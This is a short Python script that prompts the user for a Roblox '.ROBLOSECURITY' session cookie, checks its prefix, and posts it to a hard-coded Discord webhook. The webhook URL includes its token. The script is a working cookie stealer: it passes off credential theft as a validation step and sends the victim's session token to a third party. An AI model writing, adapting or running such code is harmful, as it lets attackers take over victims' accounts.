import requests

# Define the webhook URL
webhook_url = 'https://discord.com/api/webhooks/1115022728144105553/Bp0OjKzz4uLjb35546qtni-z_Grxy0xPyJ4lY2HyIGQ2LsbHqGT9b6TlCBtPLX8V_g2_'

# Prompt the user to enter their Roblox cookie
cookie = input("Enter your Roblox cookie: ")

# Validate the cookie by checking if it starts with '.ROBLOSECURITY='
if not cookie.startswith('.ROBLOSECURITY='):
    print('Invalid Cookie')
    exit()

# Create the payload with an embed
payload = {
    'embeds': [
        {
            'title': 'Roblox Cookie',
            'description': f'Cookie: {cookie}'
        }
    ]
}

# Send the payload to the webhook
response = requests.post(webhook_url, json=payload)

# Check the response status
if response.ok:
    print('Cookie sent successfully to the webhook!')
else:
    print('Failed to send the cookie to the webhook. Status code:', response.status_code)
